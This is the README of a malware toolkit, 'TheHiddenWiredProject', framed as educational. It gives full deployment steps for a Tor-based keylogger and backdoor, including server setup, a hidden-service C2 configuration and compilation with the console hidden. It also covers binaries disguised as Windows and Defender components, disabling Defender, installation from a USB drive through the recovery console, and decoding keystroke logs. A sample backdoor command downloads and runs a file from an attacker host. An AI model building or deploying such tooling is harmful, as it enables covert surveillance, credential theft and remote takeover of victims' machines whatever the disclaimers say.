> ⚠️ **DISCLAIMER**  
> This project was created exclusively for educational and cybersecurity research purposes.  
> It is intended to simulate stealth persistence, anonymized communications, and system evasion techniques inside controlled lab environments.  
> DO NOT use this tool on machines you do not own or that are not part of your virtual test network.  
> The names and behaviors simulated here are for learning and awareness only.  
> The author accepts NO responsibility for any direct, indirect, or collateral damage caused by misuse.  
> Everything demonstrated here must be used legally and ethically.

---

# 🔒 TheHiddenWiredProject (THWP)

**TheHiddenWiredProject (THWP)** is a cybersecurity research tool that emulates the behavior of advanced threats in a controlled, educational setting.  
Its goal is to study how keylogging, persistent backdoors, and anonymized command-and-control can be achieved using stealth techniques and the Tor network.

> All traffic generated by THWP is routed through Tor to simulate covert exfiltration and remote access in a lab environment.

---

## ❓ What is THWP?

- A simulated keylogging mechanism (Python-based)
- A stealth backdoor agent with command polling
- Integrated Tor communication channel
- Optional disabling of Defender components (lab-only)
- Designed for virtual machine testing and malware analysis education

---

## 🛡️ What makes it “stealthy”?

- Tor communication hidden under renamed binaries
- Simulated removal of Defender engine (without touching the GUI)
- Background persistence through system components
- Executables compiled with innocent-looking filenames and icons

⚠️ **This simulation is strictly for research use in safe, isolated environments.**

---

## 🧠 Project Architecture

| File                          | Description                                                               |
|-------------------------------|---------------------------------------------------------------------------|
| `Isass.py`                    | Tor proxy launcher and traffic router                                     |
| `SecurityHealthSystray.bat`   | Orchestrator: launches all agents and Tor silently                       |
| `WMIHost.py`                  | Core keylogging and command-execution engine                              |
| `wuasrv.exe`                  | Tor binary (renamed `tor.exe`, downloaded from the official site)         |
| `wuasrvs.py`                  | Delay tool to stagger Tor startup                                         |
| `installer.bat`               | Install script for Windows PE execution (must remain in .bat format)     |

---

## 🌐 Setting Up the Research Server (Tor + Apache2)

> Tested on Debian-based distros: Debian, Ubuntu, Mint...

```bash
sudo su
apt install apache2 tor
systemctl enable apache2 tor
systemctl start apache2 tor
```

### Configure Apache to serve command payloads:

```bash
cd /var/www/html
rm -rf *
mkdir payloads_httpcmd
cd payloads_httpcmd
nano default.txt
```

Insert command(s) you want the agent to pull and execute (e.g., PowerShell commands). This file is polled every 60 seconds.

---

### Edit the Tor configuration:

```bash
nano /etc/tor/torrc
```

Add:

```
HiddenServiceDir /var/lib/tor/serverTHWP
HiddenServicePort 80 127.0.0.1:80
```

Then restart Tor:

```bash
systemctl restart tor
```

Get your .onion domain:

```bash
cat /var/lib/tor/serverTHWP/hostname
```

---

## 🔁 Client Configuration

Edit the `Isass.py` file and set:

```python
TARGET_ONION = "yourdomain.onion"
```

This defines where the agent will send logs and fetch commands from.

---

## 🛠️ Compile Everything (Windows)

> All Python scripts must be compiled into .exe format for execution in Windows environments.

### 1. Install Python (official build, not from MS Store)

### 2. Install Nuitka

```cmd
pip install nuitka
```

### 3. Compile:

```cmd
nuitka --onefile --windows-disable-console Isass.py
nuitka --onefile --windows-disable-console WMIHost.py
nuitka --onefile --windows-disable-console wuasrvs.py
```

### 4. Compile `SecurityHealthSystray.bat` with Bat-To-Exe-Converter  
Add a Defender-like icon during compilation for realism.  
⚠️ `installer.bat` MUST remain a raw `.bat` file — do not compile it.

---

## 💾 Final USB Layout

```
E:\
├── Isass.exe
├── Installer.bat
├── SecurityHealthSystray.exe
├── WMIHost.exe
├── wuasrv.exe
└── wuasrvs.exe
```

---

## 🧪 Installation Process (In-Lab Only)

1. Boot into Windows
2. On the lock screen, go to **Shutdown > Hold SHIFT > Click Restart**
3. Go to: Troubleshoot → Advanced options → Command Prompt
4. Find the USB drive (C: → J:) using `X:\>` shell
5. Run:

```cmd
Installer.bat
```

The system reboots and THWP is now deployed in the lab VM.

---

## ⌨️ Keylogger Log Access (Simulated)

All simulated keystroke logs are stored in:

```
/var/log/apache2/access.log
```

Logs are encoded in Base32 like:

```
GET /UNIQUE_CODE/MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA HTTP/1.1
```

Convert using any Base32 decoder (online or local).

Example:

```
MNUWC33PFQQHC5LFON2G6IGDVEQHK3RA → "hello, this is a"
ORSXG5BBEE====== → "test!"
```

---

## 📥 Remote Command Execution (Simulated Backdoor)

Edit the contents of:

```
/var/www/html/payloads_httpcmd/default.txt
```

Add a single Windows command, e.g.:

```cmd
curl http://attacker.site/file.exe -o x.exe && start x.exe
```

❗ After the command is fetched, **clear the file** immediately to avoid repeated execution every 60 seconds.

---

## 📚 Research Value

This project offers insights into:

- Realistic simulation of malware-like behavior
- Tor-based anonymous communication
- Windows persistence mechanisms
- Endpoint evasion strategies

THWP is intended to teach, inspire, and **build awareness** about the techniques used by threat actors, so they can be better mitigated.

---

## 🧠 Final Reminder

> Always test in isolated lab environments.  
> Never deploy outside of your own VMs.  
> Use this tool to understand the enemy, not to become one.

---

**Created with love and paranoia by ElektroWindows. For research, not destruction.**
